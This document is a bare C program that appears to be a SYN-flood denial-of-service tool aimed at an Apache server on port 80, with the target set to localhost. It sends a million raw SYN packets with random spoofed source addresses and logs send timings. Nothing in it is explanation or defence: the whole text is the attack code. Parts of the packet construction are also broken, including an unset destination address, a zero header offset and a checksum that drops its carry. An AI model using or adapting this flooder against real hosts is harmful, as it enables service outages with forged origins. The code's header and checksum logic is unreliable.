#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define TARGET_IP "127.0.0.1" // IP address of the Apache server
#define TARGET_PORT 80 // Port of the Apache server
#define NUM_PACKETS 10000 // Number of packets to send
#define NUM_ITERATIONS 100 // Number of iterations

int main(int argc, char *argv[]) {
  // Seed the random number generator
  srand(time(NULL));

  // Create a socket
  int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  if (sockfd < 0) {
    perror("Error creating socket");
    return 1;
  }

  // Set the socket option to include the IP header
  int optval = 1;
  setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval));

  // Set the TCP header options
  struct tcp_header {
    unsigned short src_port;
    unsigned short dst_port;
    unsigned int seq_num;
    unsigned int ack_num;
    unsigned char reserved:4;
    unsigned char offset:4;
    unsigned char flags;
    unsigned short window;
    unsigned short checksum;
    unsigned short urgent_ptr;
  } tcp_hdr;
  memset(&tcp_hdr, 0, sizeof(tcp_hdr));
  tcp_hdr.dst_port = htons(TARGET_PORT);
  tcp_hdr.flags = TH_SYN;

  // Set the IP header options
  struct ip_header {
    unsigned char ver_ihl;
    unsigned char tos;
    unsigned short tlen;
    unsigned short identification;
    unsigned short flags_fo;
    unsigned char ttl;
    unsigned char proto;
    unsigned short checksum;
    unsigned int src_ip;
    unsigned int dst_ip;
  } ip_hdr;
  memset(&ip_hdr, 0, sizeof(ip_hdr));
  ip_hdr.ver_ihl = 0x45;
  ip_hdr.tos = 0;
  ip_hdr.tlen = htons(sizeof(ip_hdr) + sizeof(tcp_hdr));
  ip_hdr.identification = rand();
  ip_hdr.flags_fo = 0;
  ip_hdr.ttl = 64;
  ip_hdr.proto = IPPROTO_TCP;
    // Set the sockaddr_in structure for the target
  struct sockaddr_in target;
  memset(&target, 0, sizeof(target));
  target.sin_family = AF_INET;
  target.sin_addr.s_addr = inet_addr(TARGET_IP);

  // Open the file for writing
  FILE *f = fopen("syn_requests.txt", "w");
  if (f == NULL) {
    perror("Error opening file");
    return 1;
  }

  // Start the timer
  clock_t start = clock();

  // Send the SYN packets in a loop
  for (int i = 0; i < NUM_ITERATIONS; i++) {
    for (int j = 0; j < NUM_PACKETS; j++) {
      // Set the source IP and port to random values
      ip_hdr.src_ip = rand();
      tcp_hdr.src_port = rand();

      // Set the sequence number to a random value
      tcp_hdr.seq_num = rand();

      // Calculate the checksum
      unsigned short checksum = 0;
      checksum += (ip_hdr.src_ip >> 16) & 0xffff;
      checksum += ip_hdr.src_ip & 0xffff;
      checksum += (ip_hdr.dst_ip >> 16) & 0xffff;
      checksum += ip_hdr.dst_ip & 0xffff;
      checksum += htons(sizeof(tcp_hdr));
      unsigned short *ptr = (unsigned short *)&tcp_hdr;
      for (int k = 0; k < sizeof(tcp_hdr) / 2; k++) {
        checksum += *ptr;
        ptr++;
      }
      checksum = (checksum >> 16) + (checksum & 0xffff);
      checksum = (checksum >> 16) + (checksum & 0xffff);
      tcp_hdr.checksum = ~checksum;

      // Start the timer
      clock_t send_start = clock();

      // Send the packet
      if (sendto(sockfd, &ip_hdr, sizeof(ip_hdr) + sizeof(tcp_hdr), 0, (struct sockaddr *)&target, sizeof(target)) < 0) {
        perror("Error sending packet");
        return 1;
      }

      // End the timer and calculate the elapsed time
      clock_t send_end = clock();
      double elapsed_time = (double)(send_end - send_start) / CLOCKS_PER_SEC;

      // Write the index and elapsed time to the file
      fprintf(f, "%d %f\n", j + 1, elapsed_time);
    }
  }

  // End the timer and calculate the elapsed time
  clock_t end = clock();
  double elapsed_time = (double)(end - start) / CLOCKS_PER_SEC;

  // Print the elapsed time and average time to send a packet
  printf("Elapsed time: %f seconds\n", elapsed_time);
  printf("Average time to send a packet: %f seconds\n", elapsed_time / (NUM_ITERATIONS * NUM_PACKETS));

  // Close the file
  fclose(f);

  return 0;
}
